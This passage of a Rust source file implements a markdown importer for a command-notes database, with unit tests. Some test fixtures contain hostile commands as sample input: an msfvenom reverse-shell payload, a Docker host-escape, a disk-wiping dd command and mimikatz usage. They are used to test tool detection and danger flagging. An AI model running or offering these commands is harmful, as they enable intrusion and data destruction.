    hit(raw_title) || ancestors.iter().any(|a| hit(a))
}

fn plan(text: &str, opts: &ImportOptions) -> Plan {
    let mut report = Report::default();
    let mut norm = mdscan::normalize(text);

    // What this file itself runs in its shell blocks: lets an unfenced
    // `hashcat -m 0 …` be recognised as a command and a sentence be left alone.
    let vocab = {
        let joined = norm.lines.iter().map(|l| l.text.as_str()).collect::<Vec<_>>().join("\n");
        let blocks = fenced_blocks_lang(&joined);
        Vocab::learn(
            blocks
                .iter()
                .filter(|(lang, _)| !lang.is_empty() && derive::is_shell_lang(lang))
                .map(|(_, b)| b.as_str()),
        )
    };

    let scan = mdscan::find_headings(&mut norm.lines, &vocab);
    report.cleanup = norm.cleanup.clone();
    report.list_items = scan.demoted.len();
    report.headings = scan.heads.len();
    report.soft_headings = scan.heads.iter().filter(|h| h.kind.is_soft()).count();
    let lines = &norm.lines;

    let mut nodes: Vec<Node> = scan
        .heads
        .iter()
        .enumerate()
        .map(|(k, h)| {
            let end = scan.heads.get(k + 1).map_or(lines.len(), |n| n.at);
            let body = lines[h.at + 1..end].iter().map(|l| l.text.as_str()).collect::<Vec<_>>().join("\n");
            let body = strip_decor(&body);
            Node { at: h.at, level: h.level, kind: h.kind, raw: h.raw.clone(), title: clean_title(&h.raw), parent: None, body }
        })
        .collect();

    let mut stack: Vec<usize> = Vec::new();
    for i in 0..nodes.len() {
        while stack.last().is_some_and(|&t| nodes[t].level >= nodes[i].level) {
            stack.pop();
        }
        nodes[i].parent = stack.last().copied();
        stack.push(i);
    }
    strip_sibling_numbers(&mut nodes);

    let mut drafts: Vec<Draft> = Vec::new();
    let mut skipped = 0usize;
    let mut major = "";

    for i in 0..nodes.len() {
        let n = &nodes[i];
        if let Some(s) = banner_slug(&n.title) {
            major = s; // a banner sets the topic for everything after it
        }
        if n.title.is_empty() {
            skipped += 1;
            continue;
        }
        let low = n.title.to_lowercase();
        let anc = ancestors(&nodes, i);
        if opts.flagged_only && !is_flagged(&n.raw, &anc) {
            skipped += 1;
            continue;
        }
        if (NAV_DROP.contains(&low.as_str()) && !n.body.contains("```")) // "Print This" with a cheat sheet in it is not navigation
            || (n.body.len() < 20 && !n.body.contains("```")) // a fenced one-liner is worth keeping
            || toc_like(&n.body)
        {
            skipped += 1;
            continue;
        }

        let raw_up = n.raw.to_uppercase();
        let printed = norm.printed.iter().find(|p| n.at >= p.from && n.at <= p.to).map(|p| p.title.as_str());
        let mut tags: Vec<String> = Vec::new();
        if !major.is_empty() {
            tags.push(major.to_string());
        }
        if let Some(sec) = section_title(&nodes, i) {
            tags.push(slug(&sec, 24));
        }
        if let Some(doc) = printed {
            tags.push(slug(doc, 24));
        }
        if raw_up.contains("CRITICAL") {
            tags.push("critical".into());
        } else if raw_up.contains("IMPORTANT") {
            tags.push("important".into());
        }
        tags.extend(opts.extra_tags.iter().cloned());
        let mut seen_tag = HashSet::new();
        tags.retain(|t| !t.is_empty() && seen_tag.insert(t.clone()));
        tags.truncate(5);

        let base = display_title(&n.title, &anc);
        let keywords = context_words(&anc, &n.title, printed);
        let keys_tool = keys_context(&tags, &n.title, &anc);
        // In vim/tmux notes a heading like `dd` is a keystroke, not the program of that name.
        let heading_tool = title_tool(&n.title, &n.body, &vocab).filter(|t| keys_tool.map_or(true, |k| same_keys_tool(t, k)));
        // The whole section decides the tab, so the parts of a long one stay together.
        let whole = analyze(&n.body, &vocab, keys_tool);
        let (category, why) = categorize(&low, heading_tool.is_some(), &whole);
        // A tool profile keeps a copy-ready command (`recall cmd ls`); a note is for reading.
        let runnable = category != Category::Note;
        let parts = split_body(&n.body, MAX_PART);
        let np = parts.len();
        if np > 1 {
            report.split += 1;
        }
        for (k, part) in parts.into_iter().enumerate() {
            let title = if np > 1 { format!("{} ({}/{})", base, k + 1, np) } else { base.clone() };
            let a = analyze(&part, &vocab, keys_tool); // its own command, danger and programs
            let (content, truncated) = cap_chars(&part, HARD_CAP);
            if truncated {
                report.truncated += 1;
            }
            let tool = pick_tool(heading_tool.as_deref(), &tags, &a, &vocab);
            drafts.push(Draft {
                title: title.clone(),
                ancestors: anc.clone(),
                why,
                entry: NewEntry {
                    title,
                    content,
                    category: category.clone(),
                    tags: tags.clone(),
                    tool,
                    command: if runnable { a.command } else { String::new() },
                    keywords: keywords.clone(),
                    danger: runnable && a.danger,
                    source: Source::Import,
                    ..Default::default()
                },
            });
        }
    }

    drop_repeats(&mut drafts, &mut report);
    make_unique(&mut drafts, &mut report);

    let mut sizes: Vec<usize> = Vec::with_capacity(drafts.len());
    let mut items: Vec<NewEntry> = Vec::with_capacity(drafts.len());
    for d in drafts {
        let mut e = d.entry;
        e.title = d.title;
        match d.why {
            Why::Profile => report.profiles += 1,
            Why::Prose => report.prose_notes += 1,
            Why::ToolList | Why::Commands | Why::Text => {}
        }
        match e.category {
            Category::Command => report.commands += 1,
            Category::Note => report.notes += 1,
            Category::Tool => report.tools += 1,
        }
        if !e.tool.is_empty() {
            report.with_tool += 1;
        }
        let len = e.content.chars().count();
        sizes.push(len);
        if report.largest.as_ref().map_or(true, |(n, _)| len > *n) {
            report.largest = Some((len, e.title.clone()));
        }
        items.push(e);
    }
    sizes.sort_unstable();
    report.median_chars = sizes.get(sizes.len() / 2).copied().unwrap_or(0);

    Plan { items, skipped, report }
}

// ─── main entry point ─────────────────────────────────────────────────────────

pub fn import_markdown(db: &mut Database, path: &Path, opts: &ImportOptions) -> Result<ImportStats> {
    let text = std::fs::read_to_string(path)
        .with_context(|| format!("reading {}", path.display()))?;
    let Plan { items, skipped, report } = plan(&text, opts);

    // De-duplicate: never import data that already exists in the database, and
    // never import the same (title, content) twice within a single run. This
    // makes re-importing the same file a no-op.
    let mut existing = db.existing_title_content()?;
    let mut unique: Vec<NewEntry> = Vec::with_capacity(items.len());
    let mut duplicates = 0usize;
    for e in items {
        let key = (e.title.clone(), e.content.clone());
        if existing.contains(&key) {
            duplicates += 1;
        } else {
            existing.insert(key);
            unique.push(e);
        }
    }

    let candidates = unique.len();
    if !opts.dry_run {
        db.add_entries(&unique)?;
    }
    Ok(ImportStats { candidates, skipped, duplicates, report })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn opts() -> ImportOptions {
        ImportOptions { dry_run: false, flagged_only: false, extra_tags: vec![] }
    }
    fn entries(md: &str) -> Vec<NewEntry> {
        plan(md, &opts()).items
    }
    fn titles(md: &str) -> Vec<String> {
        entries(md).into_iter().map(|e| e.title).collect()
    }
    fn find<'a>(es: &'a [NewEntry], title: &str) -> &'a NewEntry {
        es.iter().find(|e| e.title == title).unwrap_or_else(|| panic!("no entry {:?} in {:?}", title, es.iter().map(|e| &e.title).collect::<Vec<_>>()))
    }

    // ── structure ──

    #[test]
    fn every_heading_level_makes_an_entry_and_containers_are_dropped() {
        let md = "# Doc title\n\n## Section\n\n### Leaf one\n\nFirst body text here, long enough.\n\n### Leaf two\n\nSecond body text here, long enough.\n";
        assert_eq!(titles(md), vec!["Leaf one", "Leaf two"]);
    }

    #[test]
    fn h1_sections_split_instead_of_being_glued_into_one_entry() {
        // The bug this replaced: single-# headings were ignored, so all three sections became one.
        let md = "## Setup\n\nSetup text that is long enough.\n\n# Privilege Escalation\n\nEscalation text that is long enough.\n\n# Instagram Recovery\n\nRecovery text that is long enough.\n";
        assert_eq!(titles(md), vec!["Setup", "Privilege Escalation", "Instagram Recovery"]);
    }

    #[test]
    fn hash_comments_inside_code_stay_in_the_entry() {
        let md = "## Backup\n\n```bash\n# make a tarball\ntar czf a.tgz dir\n\n# and copy it\ncp a.tgz /mnt\n```\n";
        let es = entries(md);
        assert_eq!(es.len(), 1);
        assert!(es[0].content.contains("# and copy it"));
    }

    #[test]
    fn a_pdf_style_dump_becomes_focused_entries_without_page_junk() {
        let page = |n: u32| format!("3/15/26, 11:40 PM\nUnbreakable Encryption Methods\n\n<https://chatgpt.com/c/x>\n{}/103\n", n);
        let md = format!(
            "{p0}\n## Encryption\n\n1️⃣ Strong algorithm\n\nAES-256 is used by governments and militaries.\n\n2️⃣ Strong key derivation\n\nIf you use a password, the system must slow down attackers.\n\n{p1}\nGood systems use:\n\n## PBKDF2\n\nArgon2\n\nscrypt\n\nThese make brute-forcing passwords extremely expensive.\n\n{p2}\n3️⃣ Strong passphrase\n\nThis is actually the weakest link most of the time.\n\n{p3}\n",
            p0 = page(5), p1 = page(6), p2 = page(7), p3 = page(8)
        );
        let es = entries(&md);
        let names: Vec<&str> = es.iter().map(|e| e.title.as_str()).collect();
        assert_eq!(names, vec!["Strong algorithm", "Strong key derivation", "Strong passphrase"]);
        let kd = find(&es, "Strong key derivation");
        assert!(kd.content.contains("Good systems use:") && kd.content.contains("- PBKDF2") && kd.content.contains("scrypt"));
        assert!(es.iter().all(|e| !e.content.contains("chatgpt.com") && !e.content.contains("11:40")));
        assert!(es.iter().all(|e| e.category == Category::Note), "prose about passphrases is not a command");
        assert!(kd.tags.iter().any(|t| t.starts_with("unbreakable")), "the printed title is kept as context: {:?}", kd.tags);
        assert!(kd.keywords.contains("unbreakable"));
    }

    #[test]
    fn banners_set_the_topic_tag_for_what_follows() {
        let md = "# =========\n# GIT & GITHUB\n# =========\n\n## Undo a commit\n\n```bash\ngit reset --soft HEAD~1\n```\n";
        let e = &entries(md)[0];
        assert_eq!(e.tags.first().map(String::as_str), Some("git"));
    }

    // ── titles ──

    #[test]
    fn generic_and_duplicate_titles_are_made_meaningful_by_their_parent() {
        let md = "## Docker\n\n### Best Practices\n\nRun as a non-root user always.\n\n## Git\n\n### Best Practices\n\nCommit small and often, with messages.\n\n## Vim\n\n### Examples\n\nUse dd to delete a line quickly.\n";
        let t = titles(md);
        assert!(t.contains(&"Docker — Best Practices".to_string()), "{:?}", t);
        assert!(t.contains(&"Git — Best Practices".to_string()), "{:?}", t);
        assert!(t.contains(&"Vim — Examples".to_string()), "{:?}", t);
        assert!(t.iter().all(|x| !x.ends_with(')')), "no bare counters when parents differ: {:?}", t);
    }

    #[test]
    fn identical_titles_under_identical_parents_get_a_counter_as_a_last_resort() {
        let md = "## Notes\n\n### Tip\n\nThe first tip body is here.\n\n### Tip\n\nThe second tip body is here.\n";
        assert_eq!(titles(md), vec!["Notes — Tip", "Notes — Tip (2)"]);
    }

    #[test]
    fn title_cleaning() {
        assert_eq!(clean_title("🔴 **Tier 0** — `sudo tee` fails"), "Tier 0 — sudo tee fails");
        assert_eq!(clean_title("3.1 The First Line (Shebang)"), "The First Line (Shebang)");
        assert_eq!(clean_title("13.2.4. Deep"), "Deep");
        assert_eq!(clean_title("1️⃣ Strong algorithm"), "Strong algorithm");
        assert_eq!(clean_title("2) Options"), "Options");
        assert_eq!(clean_title("[Link text](#anchor)"), "Link text");
        assert_eq!(clean_title("Lock down your accounts (highest"), "Lock down your accounts");
        assert_eq!(clean_title("Keep (this) intact"), "Keep (this) intact");
        assert_eq!(clean_title("2FA setup"), "2FA setup");
        assert_eq!(clean_title("5 things"), "5 things");
    }

    #[test]
    fn angle_brackets_in_a_title_are_text_unless_they_are_a_real_html_tag() {
        assert_eq!(clean_title("`<` (Less Than) - Input Redirection"), "< (Less Than) - Input Redirection");
        assert_eq!(clean_title("`<<<` (Here String)"), "<<< (Here String)");
        assert_eq!(clean_title("`>>` Append"), ">> Append");
        assert_eq!(clean_title("Setup <a id=\"setup\"></a>"), "Setup");
        assert_eq!(clean_title("Use <b>bold</b> text"), "Use bold text");
        assert_eq!(clean_title("`<div>` element"), "<div> element", "tags inside backticks are code");
    }

    #[test]
    fn a_table_whose_rows_link_to_sections_is_content_not_a_toc() {
        let md = "## Quick Command Index\n\n| Task | Command | Section |\n|---|---|---|\n| Update | `sudo apt update` | [Packages](#packages) |\n| Scan | `nmap -sS host` | [Recon](#recon) |\n| Fuzz | `ffuf -u http://t/FUZZ` | [Web](#web) |\n";
        assert_eq!(titles(md), vec!["Quick Command Index"]);
        assert!(is_toc_line("3. [Three](#three)") && is_toc_line("- [Git Basics](#git-basics)") && is_toc_line("  * [Sub](#sub)"));
        assert!(!is_toc_line("| a | [b](#c) |") && !is_toc_line("See [this](#that) for more"));
    }

    #[test]
    fn navigation_titles_with_a_cheat_sheet_inside_are_kept() {
        let md = "## Print This\n\n```bash\ntmux new -s name\ntmux a -t name\n```\n\n## Tags\n\nvim, editor, commands, reference\n";
        assert_eq!(titles(md), vec!["Print This"], "the code-bearing one is kept, the bare tag list dropped");
    }

    #[test]
    fn a_quick_reference_card_and_an_overview_with_content_are_kept() {
        let md = "## Git\n\n### Quick Reference Card\n\n```bash\ngit status\ngit add file\ngit commit -m \"message\"\n```\n\n### Overview\n\nGit tracks changes to files over time.\n";
        let t = titles(md);
        assert!(t.contains(&"Quick Reference Card".to_string()) || t.iter().any(|x| x.contains("Quick Reference Card")), "{:?}", t);
        assert!(t.contains(&"Git — Overview".to_string()), "{:?}", t);
    }

    #[test]
    fn bare_numbers_are_stripped_only_when_siblings_count_up() {
        let counting = "## Guide\n\n### 1 Introduction\n\nIntro text that is long enough.\n\n### 2 Getting Help - Your Best Friend\n\nHelp text that is long enough.\n";
        assert_eq!(titles(counting), vec!["Introduction", "Getting Help - Your Best Friend"]);
        let lone = "## Guide\n\n### 5 things to know\n\nThings text that is long enough.\n";
        assert_eq!(titles(lone), vec!["5 things to know"]);
    }

    // ── category, command, tool ──

    #[test]
    fn a_stray_command_word_in_prose_is_not_a_command() {
        // The bug this replaced: two lines starting "cat " / "sudo " made a 700-line essay a [CMD].
        let mut body = String::new();
        for i in 0..40 {
            body.push_str(&format!("Sentence number {} about encryption and why it matters.\n\n", i));
        }
        body.push_str("cat photo.jpg secret.gpg > vacation.jpg\n\nsudo apt update\n");
        let md = format!("## Hiding data\n\n{}", body);
        let es = plan(&md, &opts()).items;
        let total: usize = es.len();
        assert!(total >= 1);
        assert!(es.iter().all(|e| e.category == Category::Note), "{:?}", es.iter().map(|e| (&e.title, &e.category)).collect::<Vec<_>>());
    }

    #[test]
    fn a_fenced_shell_block_is_a_command_with_its_tool_and_command() {
        let md = "## Host discovery\n\n```bash\n# ping sweep\nnmap -sn 10.0.0.0/24\nnmap -sn 10.0.1.0/24\n```\n";
        let e = &entries(md)[0];
        assert_eq!(e.category, Category::Command);
        assert_eq!(e.tool, "nmap");
        assert!(e.command.contains("nmap -sn 10.0.0.0/24"));
        assert!(!e.danger);
    }

    #[test]
    fn code_in_other_languages_is_a_note_not_a_command() {
        let md = "## A python helper\n\n```python\nimport os\nprint(os.getcwd())\n```\n";
        let e = &entries(md)[0];
        assert_eq!(e.category, Category::Note);
        assert_eq!(e.command, "");
        assert_eq!(e.tool, "");
    }

    #[test]
    fn a_bare_fence_used_as_a_text_box_is_not_a_command() {
        let md = "## When to use SSH\n\n```\nUse SSH when:\n- you need tunneling\n- you need a shell\n```\n";
        assert_eq!(entries(md)[0].category, Category::Note);
    }

    #[test]
    fn vim_and_tmux_blocks_are_commands_for_their_own_tool() {
        let md = "## Delete lines\n\n```vim\ndd\n:%d\n:g/^$/d\n```\n";
        let e = &entries(md)[0];
        assert_eq!((e.category.clone(), e.tool.as_str()), (Category::Command, "vim"));
    }

    #[test]
    fn dense_unfenced_command_lines_make_a_command() {
        let md = "## Encrypt a file\n\nUse gpg for it:\n\ngpg -c --cipher-algo AES256 secret.txt\ngpg -d secret.txt.gpg > secret.txt\n\nThat is all.\n";
        let e = &entries(md)[0];
        assert_eq!(e.category, Category::Command);
        assert_eq!(e.tool, "gpg");
        assert!(e.command.starts_with("gpg -c --cipher-algo AES256 secret.txt"), "{:?}", e.command);
    }

    #[test]
    fn the_tool_is_the_one_most_commands_run_not_the_first_line() {
        let md = "## Docker socket exposure\n\n```bash\nls -la /var/run/docker.sock\ndocker ps\ndocker run -v /:/host -it alpine chroot /host\ndocker exec -it x sh\n```\n";
        assert_eq!(entries(md)[0].tool, "docker");
    }

    #[test]
    fn a_heading_that_names_a_program_wins() {
        let md = "## msfvenom (Payload Generator)\n\n```bash\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=1.2.3.4 LPORT=4444 -f elf > s.elf\nchmod +x s.elf\nchmod 755 s.elf\n```\n";
        assert_eq!(entries(md)[0].tool, "msfvenom");
        // English words that are also programs don't count when capitalised on their own
        let md = "## Install\n\n```bash\nsudo apt update\nsudo apt install nmap\n```\n";
        assert_eq!(entries(md)[0].tool, "apt");
    }

    #[test]
    fn ssh_config_directives_in_a_fence_are_not_the_host_program() {
        let md = "## Client config\n\n```bash\nHost myserver\n    HostName 192.168.1.100\n    User admin\n    Port 2222\n```\n";
        let e = &entries(md)[0];
        assert_eq!(e.tool, "", "'Host' is a directive here, not the host(1) command");
    }

    #[test]
    fn keybinding_notation_is_never_a_tool() {
        let md = "## Help & Debug\n\n```bash\nC-h k   # describe key\nC-h f\nC-h v\n```\n";
        assert_eq!(entries(md)[0].tool, "");
    }

    #[test]
    fn a_grab_bag_of_unrelated_commands_has_no_single_tool() {
        let md = "## Misc\n\n```bash\nsystemctl status ssh\ndf -h\nfree -m\nuname -a\nip a\n```\n";
        assert_eq!(entries(md)[0].tool, "");
    }

    #[test]
    fn a_tools_section_without_commands_is_a_tool_entry() {
        let md = "## Wireless Scanning Tools\n\nKismet and Wash cover most of what you need here.\n";
        assert_eq!(entries(md)[0].category, Category::Tool);
        let md = "## Installation\n\nDownload the release and unpack it somewhere.\n";
        assert_eq!(entries(md)[0].category, Category::Note, "'install' alone does not make a tool");
    }

    #[test]
    fn danger_is_checked_across_every_block() {
        let md = "## Cleanup\n\n```bash\nls /tmp\n```\n\nThen:\n\n```bash\nsudo dd if=/dev/zero of=/dev/sda bs=1M\n```\n";
        assert!(entries(md)[0].danger);
    }

    // ── size, drops, options ──

    #[test]
    fn a_long_section_is_split_at_paragraphs_and_never_inside_code() {
        let para = "This paragraph is a line of ordinary prose that repeats.\n\n".repeat(3);
        let code = format!("```bash\n{}```\n\n", "echo line\n\n".repeat(30));
        let md = format!("## Long one\n\n{}{}{}{}{}", para.repeat(40), code, para.repeat(40), code, para.repeat(40));
        let es = entries(&md);
        assert!(es.len() >= 3, "{} parts", es.len());
        assert!(es[0].title.starts_with("Long one (1/"));
        for e in &es {
            assert_eq!(e.content.matches("```").count() % 2, 0, "balanced fences in every part");
            assert!(e.content.chars().count() <= MAX_PART + 200);
        }
    }

    #[test]
    fn toc_and_navigation_sections_are_dropped() {
        let md = "## Table of Contents\n\n1. [One](#one)\n2. [Two](#two)\n3. [Three](#three)\n\n## Contents list\n\n- [One](#one)\n- [Two](#two)\n- [Three](#three)\n\n## Real\n\nActual content that is long enough.\n";
        assert_eq!(titles(md), vec!["Real"]);
    }

    #[test]
    fn flagged_only_keeps_critical_and_important_sections_and_their_children() {
        let md = "## CRITICAL Notes\n\n### Child one\n\nChild one body that is long enough.\n\n## Other\n\n### Child two\n\nChild two body that is long enough.\n";
        let o = ImportOptions { flagged_only: true, ..opts() };
        let t: Vec<String> = plan(md, &o).items.into_iter().map(|e| e.title).collect();
        assert_eq!(t, vec!["Child one"]);
    }

    #[test]
    fn extra_tags_are_attached() {
        let o = ImportOptions { extra_tags: vec!["master".into()], ..opts() };
        let e = &plan("## A heading\n\nBody text that is long enough.\n", &o).items[0];
        assert!(e.tags.contains(&"master".to_string()));
    }

    #[test]
    fn output_is_deterministic() {
        let md = "## A\n\n### Tip\n\nBody text number one.\n\n### Tip\n\nBody text number two.\n\n## B\n\n### Tip\n\nBody text number three.\n";
        let a: Vec<String> = titles(md);
        for _ in 0..5 {
            assert_eq!(titles(md), a);
        }
    }

    // ── database ──

    fn tmp_db() -> (Database, std::path::PathBuf) {
        let nanos = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_nanos();
        let mut p = std::env::temp_dir();
        p.push(format!("recall_importtest_{}_{}.db", std::process::id(), nanos));
        let _ = std::fs::remove_file(&p);
        (Database::new(&p).unwrap(), p)
    }

    fn cleanup(p: &Path) {
        for ext in ["", "-wal", "-shm"] {
            let mut s = p.as_os_str().to_owned();
            s.push(ext);
            let _ = std::fs::remove_file(std::path::PathBuf::from(s));
        }
    }

    #[test]
    fn importing_twice_stores_nothing_the_second_time_and_dry_run_writes_nothing() {
        let (mut db, dbp) = tmp_db();
        let mut f = std::env::temp_dir();
        f.push(format!("recall_importsrc_{}.md", std::process::id()));
        std::fs::write(&f, "## One\n\nFirst body that is long enough.\n\n## Two\n\n```bash\nls -la /var/log/syslog\n```\n").unwrap();

        let dry = import_markdown(&mut db, &f, &ImportOptions { dry_run: true, ..opts() }).unwrap();
        assert_eq!(dry.candidates, 2);
        assert_eq!(db.existing_title_content().unwrap().len(), 0, "dry run wrote nothing");

        let first = import_markdown(&mut db, &f, &opts()).unwrap();
        assert_eq!((first.candidates, first.duplicates), (2, 0));
        let again = import_markdown(&mut db, &f, &opts()).unwrap();
        assert_eq!((again.candidates, again.duplicates), (0, 2));

        let _ = std::fs::remove_file(&f);
        cleanup(&dbp);
    }

    #[test]
    fn a_section_pasted_twice_is_one_entry_but_the_same_title_under_another_parent_is_kept() {
        let md = "## Docker\n\n### Best Practices\n\nRun as a non-root user always.\n\n### Best Practices\n\nRun as a non-root user always.\n\n## Git\n\n### Best Practices\n\nRun as a non-root user always.\n";
        let p = plan(md, &opts());
        assert_eq!(p.report.repeats, 1);
        assert_eq!(p.items.iter().map(|e| e.title.as_str()).collect::<Vec<_>>(), vec!["Docker — Best Practices", "Git — Best Practices"]);
    }

    #[test]
    fn banner_rules_and_horizontal_rules_are_not_entry_content() {
        let md = "# =====\n# TMUX\n# =====\n\n## Splits\n\n---\n\nUse prefix % to split the window in two.\n\n---\n";
        let es = entries(md);
        assert_eq!(es.len(), 1, "{:?}", es.iter().map(|e| (&e.title, &e.content)).collect::<Vec<_>>());
        assert_eq!(es[0].content, "Use prefix % to split the window in two.");
    }

    #[test]
    fn every_stage_of_a_pipeline_counts_toward_the_tool() {
        let md = "## Swap words\n\n```bash\necho \"a b\" | sed 's/a/b/'\necho \"c d\" | sed -E 's/c|d/e/g'\n```\n";
        assert_eq!(entries(md)[0].tool, "sed");
    }

    // ── command recognition: plumbing, bullets, key tables ──

    #[test]
    fn cd_and_source_blocks_are_commands_but_ssh_config_stays_a_note() {
        let md = "## cd\n\n```bash\ncd /path/to/dir\ncd ..\ncd ~\n```\n";
        let e = &entries(md)[0];
        assert_eq!((e.category.clone(), e.tool.as_str()), (Category::Command, "cd"));
        let md = "## Reload\n\n```bash\nsource ~/.bashrc\n```\n";
        assert_eq!(entries(md)[0].category, Category::Command);
        let md = "## Client config\n\n```bash\nHost myserver\n    HostName 1.2.3.4\n    Port 2222\n```\n";
        assert_eq!(entries(md)[0].category, Category::Note);
    }

    #[test]
    fn a_bullet_list_of_inline_commands_is_a_command_entry_with_a_copy_ready_command() {
        let md = "## Search options\n\n- `:set hlsearch` - Highlight search results\n- `:set incsearch` - Incremental search\n- `:noh` - Clear highlighting\n";
        let e = &entries(md)[0];
        assert_eq!(e.category, Category::Command);
        assert_eq!(e.command, ":set hlsearch\n:set incsearch\n:noh");
    }

    #[test]
    fn a_key_table_in_a_vim_section_is_a_command_for_vim() {
        let md = "## Vim editing keys\n\n```\nx          delete char\ndd         delete line\n```\n";
        let e = &entries(md)[0];
        assert_eq!((e.category.clone(), e.tool.as_str()), (Category::Command, "vim"));
        let elsewhere = "## Two columns\n\n```\nx          delete char\ndd         delete line\n```\n";
        assert_ne!(entries(elsewhere)[0].tool, "vim");
    }

    // ── one entry per section, in the right tab ──

    /// A tool card the way the notes write them: description, syntax, options, examples.
    const LS_CARD: &str = "## File and Directory Operations\n\n### ls\n\n**Description:** List directory contents with various formatting options.\n\n**When to use:** Viewing files and their properties, checking permissions, sorting by date or size.\n\n**Syntax:**\n```bash\nls [options] [file/directory]\n```\n\n**Important options:**\n- `-l`: Long format (permissions, owner, size, date)\n- `-a`: Show hidden files (starting with .)\n\n**Examples:**\n```bash\n# Detailed listing with human-readable sizes\nls -lah /home/user/\n\n# Sort by modification time, newest first\nls -lt /var/log/\n```\n";

    #[test]
    fn a_cheat_sheet_is_one_entry_and_its_commands_are_not_copied_out() {
        // The bug this replaced: every annotated line also became an entry of its own,
        // so `ls`, `mkdir`, `df` … were listed again, one per line, next to the section.
        let md = "# Essential Linux Commands: A Practical Reference\n\n```bash\n# File operations\nls -la                    # List files with details\nmkdir -p /path/to/dir     # Create directory and parents\n\n# System info\ndf -h                     # Disk space\nfree -h                   # Memory usage\n```\n";
        let es = entries(md);
        assert_eq!(es.iter().map(|e| e.title.as_str()).collect::<Vec<_>>(), vec!["Essential Linux Commands: A Practical Reference"]);
        assert_eq!(es[0].category, Category::Command);
        let es = entries(LS_CARD);
        assert_eq!(es.len(), 1, "the examples inside a card stay in the card");
    }

    #[test]
    fn a_program_profile_is_a_tool_entry_that_keeps_its_command() {
        let e = &entries(LS_CARD)[0];
        assert_eq!((e.category.clone(), e.tool.as_str()), (Category::Tool, "ls"));
        assert!(e.command.starts_with("ls "), "`recall cmd ls` still prints something: {:?}", e.command);
        for title in ["cat - Concatenate Files", "nmap (Advanced)", "gzip/gunzip", "tmux: A Comprehensive Guide"] {
            let program = title.split(|c: char| !c.is_alphanumeric() && c != '-').next().unwrap();
            let md = format!("## {}\n\nWhat this program does, in a sentence or two.\n\nWhen it is the right one to reach for.\n\n```bash\n{} --help\n```\n", title, program);
            assert_eq!(entries(&md)[0].category, Category::Tool, "{:?}", title);
        }
    }

    #[test]
    fn a_program_heading_over_commands_alone_is_a_command() {
        let md = "## nmap\n\n```bash\nnmap -sn 10.0.0.0/24\nnmap -sV -p- 10.0.0.5\n```\n";
        let e = &entries(md)[0];
        assert_eq!((e.category.clone(), e.tool.as_str()), (Category::Command, "nmap"), "a cheat sheet, not a profile");
    }

    #[test]
    fn a_program_the_file_rarely_runs_is_named_by_its_heading_when_its_code_uses_it() {
        let md = "### mimikatz\n\n**Description:** Tool for extracting plaintext passwords from memory.\n\n**When to use:** Windows post-exploitation, credential extraction.\n\n```bash\n# Usually run through Metasploit\nmeterpreter> load mimikatz\n```\n\n### openvas\n\n**Description:** Comprehensive vulnerability assessment tool.\n\n**When to use:** Full vulnerability scans, compliance checking.\n\n```bash\nsudo apt install openvas\nsudo gvm-setup\n```\n";
        let es = entries(md);
        assert_eq!((es[0].category.clone(), es[0].tool.as_str()), (Category::Tool, "mimikatz"));
        assert_eq!((es[1].category.clone(), es[1].tool.as_str()), (Category::Tool, "openvas"), "not `apt`, which only installs it");
        // a lower-case heading the code never uses is not a program: an Obsidian `cssclasses:` key
        let md = "# cssclasses:\n\nLet's plan a proper scanning methodology for the target network.\n\n```bash\nnmap -sn 10.0.0.0/24\nnmap -sS -p- 10.0.0.5\n```\n";
        assert_ne!(entries(md)[0].category, Category::Tool);
        assert_eq!(title_tool("or", "```bash\ngit pull or push\n```", &Vocab::seed()), None, "an English word");
        assert_eq!(title_tool("input/output", "`input` and `output`", &Vocab::seed()), None, "two words");
    }

    #[test]
    fn a_keystroke_heading_in_vim_notes_is_not_the_program_of_that_name() {
        let md = "## Vim\n\n### dd\n\nDeletes the current line and puts it in the unnamed register.\n\nA count in front deletes that many lines.\n\n```vim\ndd\n3dd\n```\n";
        let e = &entries(md)[0];
        assert_ne!(e.category, Category::Tool, "dd here is a keystroke, not dd(1)");
        assert_eq!(e.tool, "vim");
    }

    #[test]
    fn an_article_that_mentions_a_few_commands_is_a_note() {
        let mut md = String::from("## When should you use Tor vs Firefox?\n\nUse Firefox for normal browsing and Tor Browser when you need anonymity.\n\n");
        for i in 0..14 {
            md.push_str(&format!("Point number {} about identities, logins and why anonymity breaks when you mix them.\n\n", i));
        }
        md.push_str("```bash\ntar -czf secret.tar.gz folder/\ngpg -c --cipher-algo AES256 secret.tar.gz\n```\n");
        let p = plan(&md, &opts());
        let e = &p.items[0];
        assert_eq!(e.category, Category::Note);
        assert_eq!((e.command.as_str(), e.danger), ("", false), "a note is for reading");
        assert_eq!(p.report.prose_notes, 1);
    }

    #[test]
    fn a_command_with_a_short_explanation_stays_a_command() {
        let md = "## Process Inspection\n\n```bash\nps aux | grep -i warp | grep -v grep\n```\n**Purpose:** Check for running Warp Terminal processes\n**Explanation:**\n- `ps aux` - Lists all running processes with detailed information\n  - `a` = all users' processes\n  - `u` = user-oriented format (shows user, CPU, memory)\n- `grep -i warp` - Filters results to lines containing \"warp\"\n- `grep -v grep` - Excludes the grep command itself from results\n- **Result:** Found multiple Warp processes running normally\n";
        assert_eq!(entries(md)[0].category, Category::Command);
    }

    #[test]
    fn option_bullets_alone_are_reference_not_commands() {
        let md = "## Common flags\n\n- `-l` - Use a long listing format\n- `-a` - Do not ignore entries starting with a dot\n- `-h` - Print sizes in human readable format\n";
        assert_eq!(entries(md)[0].category, Category::Note);
    }

    #[test]
    fn the_parts_of_a_long_section_share_its_category() {
        let prose = "Background on the subject, written out as a full paragraph of explanation.\n\n".repeat(90);
        let md = format!("## Long guide\n\n{}```bash\nls -la /etc\n```\n\n{}", prose, prose);
        let es = entries(&md);
        assert!(es.len() > 1);
        assert!(es.iter().all(|e| e.category == Category::Note), "{:?}", es.iter().map(|e| (&e.title, &e.category)).collect::<Vec<_>>());
    }

    #[test]
    fn prose_weight_ignores_labels_and_rules_and_weighs_long_lines() {
        assert_eq!(prose_weight("**Examples:**"), 0);
        assert_eq!(prose_weight("Basic scans:"), 0);
        assert_eq!(prose_weight("|---|---|"), 0);
        assert_eq!(prose_weight("**Description:** List directory contents."), 1);
        assert_eq!(prose_weight(&"word ".repeat(60)), 3);
    }

    #[test]
    fn the_report_summarises_what_the_parser_did() {
        let md = "## One\n\nFirst body that is long enough.\n\n## Two\n\n```bash\nls -la /var/log/syslog\n```\n";
        let r = plan(md, &opts()).report;
